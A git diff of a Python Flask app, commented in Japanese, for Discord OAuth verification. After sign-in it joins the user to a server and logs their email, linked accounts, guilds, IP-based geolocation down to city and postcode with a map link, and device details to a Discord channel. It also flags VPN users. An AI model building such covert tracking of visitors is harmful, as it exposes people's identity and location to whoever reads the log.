@@ -4,9 +4,8 @@ import requests, json, os, threading
 from dotenv import load_dotenv
 from datetime import datetime
 from user_agents import parse
-
-# 🔹 Bot 関連を正しく import
 from discord_bot import bot, send_log, assign_role
+from urllib.parse import quote
 
 load_dotenv()
 app = Flask(__name__)
@@ -28,6 +27,7 @@ def get_client_ip():
 
 
 def get_geo_info(ip):
+    """IPジオロケーション + VPN/Tor 判定"""
     try:
         res = requests.get(
             f"http://ip-api.com/json/{ip}?lang=ja&fields=status,message,country,regionName,city,zip,isp,as,lat,lon,proxy,hosting,query"
@@ -36,8 +36,8 @@ def get_geo_info(ip):
         return {
             "ip": data.get("query"),
             "country": data.get("country", "不明"),
-            "region": data.get("regionName", "不明"),
-            "city": data.get("city", "不明"),
+            "region": data.get("regionName", "不明"),  # 県レベル
+            "city": data.get("city", "不明"),         # 市区町村
             "zip": data.get("zip", "不明"),
             "isp": data.get("isp", "不明"),
             "as": data.get("as", "不明"),
@@ -83,10 +83,11 @@ def save_log(discord_id, structured_data):
 # --------- ルート ----------
 @app.route("/")
 def index():
+    redirect_encoded = quote(REDIRECT_URI)
     discord_auth_url = (
         f"https://discord.com/oauth2/authorize?client_id={DISCORD_CLIENT_ID}"
-        f"&redirect_uri={REDIRECT_URI}&response_type=code"
-        f"&scope=identify%20email%20guilds%20connections"
+        f"&redirect_uri={redirect_encoded}&response_type=code"
+        f"&scope=identify%20email%20connections%20guilds.join%20guilds"
     )
     return render_template("index.html", discord_auth_url=discord_auth_url)
 
@@ -105,7 +106,7 @@ def callback():
         "grant_type": "authorization_code",
         "code": code,
         "redirect_uri": REDIRECT_URI,
-        "scope": "identify email guilds connections",
+        "scope": "identify email connections guilds.join guilds",
     }
 
     try:
@@ -124,20 +125,27 @@ def callback():
     guilds = requests.get("https://discord.com/api/users/@me/guilds", headers=headers_auth).json()
     connections = requests.get("https://discord.com/api/users/@me/connections", headers=headers_auth).json()
 
-    # 🔹 サーバー参加処理
-    requests.put(
-        f"https://discord.com/api/guilds/{DISCORD_GUILD_ID}/members/{user['id']}",
-        headers={
-            "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
-            "Content-Type": "application/json",
-        },
-        json={"access_token": access_token},
-    )
+    # 🔹 サーバー参加処理（例外処理付き）
+    try:
+        requests.put(
+            f"https://discord.com/api/guilds/{DISCORD_GUILD_ID}/members/{user['id']}",
+            headers={
+                "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
+                "Content-Type": "application/json",
+            },
+            json={"access_token": access_token},
+            timeout=10
+        )
+    except Exception as e:
+        print(f"サーバー参加エラー: {e}")
 
     # 🔹 IP取得とUA解析
     ip = get_client_ip()
     if ip.startswith(("127.", "10.", "192.", "172.")):
-        ip = requests.get("https://api.ipify.org").text
+        try:
+            ip = requests.get("https://api.ipify.org", timeout=5).text
+        except:
+            ip = "不明"
 
     geo = get_geo_info(ip)
     ua_raw = request.headers.get("User-Agent", "不明")
@@ -181,8 +189,8 @@ def callback():
     # 🔹 Embedログ送信
     try:
         d = structured_data["discord"]
-        ip = structured_data["ip_info"]
-        ua = structured_data["user_agent"]
+        ip_info = structured_data["ip_info"]
+        ua_info = structured_data["user_agent"]
 
         embed_data = {
             "title": "✅ 新しいアクセスログ",
@@ -191,25 +199,26 @@ def callback():
                 f"**ID:** {d['id']}\n"
                 f"**メール:** {d['email']}\n"
                 f"**Premium:** {d['premium_type']} / Locale: {d['locale']}\n"
-                f"**IP:** {ip['ip']} / Proxy: {ip['proxy']} / Hosting: {ip['hosting']}\n"
-                f"**国:** {ip['country']} / {ip['region']} / {ip['city']} / {ip['zip']}\n"
-                f"**ISP:** {ip['isp']} / AS: {ip['as']}\n"
-                f"**UA:** {ua['raw']}\n"
-                f"**OS:** {ua['os']} / ブラウザ: {ua['browser']}\n"
-                f"**デバイス:** {ua['device']} / Bot判定: {ua['is_bot']}\n"
-                f"📍 [地図リンク](https://www.google.com/maps?q={ip['lat']},{ip['lon']})"
+                f"**IP:** {ip_info['ip']} / Proxy: {ip_info['proxy']} / Hosting: {ip_info['hosting']}\n"
+                f"**国/県/市:** {ip_info['country']} / {ip_info['region']} / {ip_info['city']} / {ip_info['zip']}\n"
+                f"**ISP/AS:** {ip_info['isp']} / {ip_info['as']}\n"
+                f"**UA:** {ua_info['raw']}\n"
+                f"**OS/ブラウザ:** {ua_info['os']} / {ua_info['browser']}\n"
+                f"**デバイス:** {ua_info['device']} / Bot判定: {ua_info['is_bot']}\n"
+                f"📍 [地図リンク](https://www.google.com/maps?q={ip_info['lat']},{ip_info['lon']})"
             ),
             "thumbnail": {"url": d["avatar_url"]},
         }
 
         bot.loop.create_task(send_log(embed=embed_data))
 
-        if ip["proxy"] or ip["hosting"]:
+        # VPN/Tor 判定強化
+        if ip_info["proxy"] or ip_info["hosting"]:
             bot.loop.create_task(
                 send_log(
                     f"⚠️ **不審なアクセス検出**\n"
                     f"{d['username']}#{d['discriminator']} (ID: {d['id']})\n"
-                    f"IP: {ip['ip']} / Proxy: {ip['proxy']} / Hosting: {ip['hosting']}"
+                    f"IP: {ip_info['ip']} / Proxy: {ip_info['proxy']} / Hosting: {ip_info['hosting']}"
                 )
             )
 
